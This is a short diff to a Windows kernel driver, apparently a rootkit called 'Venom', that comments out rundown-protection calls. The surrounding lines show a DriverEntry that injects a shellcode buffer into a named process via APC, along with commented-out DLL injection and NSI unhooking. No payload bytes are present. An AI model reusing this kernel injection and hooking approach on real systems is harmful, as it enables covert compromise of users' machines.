@@ -5,7 +5,7 @@
 #include "Ioctl.h"
 #include "NetworkHandler.h"
 
-EX_RUNDOWN_REF ApcHandler::g_rundown_protection;
+//EX_RUNDOWN_REF ApcHandler::g_rundown_protection;
 
 extern "C" NTSTATUS
 DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
@@ -56,7 +56,7 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	auto shellcode = NonPagedBuffer(30);
 	auto process = Process(processName);
 	auto apcInjector = APCInjector(process, shellcode);
-	::ExInitializeRundownProtection(&ApcHandler::g_rundown_protection);
+	//::ExInitializeRundownProtection(&ApcHandler::g_rundown_protection);
 
 	status = apcInjector.inject();
 	//status = UMInjectionHandler::injectDll(HandleToUlong(pid));
@@ -122,5 +122,5 @@ void VenomUnload(PDRIVER_OBJECT DriverObject)
 	//	DbgPrint("Couldn't unhook NSI");
 	//}
 
-	::ExWaitForRundownProtectionRelease(&ApcHandler::g_rundown_protection);
+	//::ExWaitForRundownProtectionRelease(&ApcHandler::g_rundown_protection);
 }
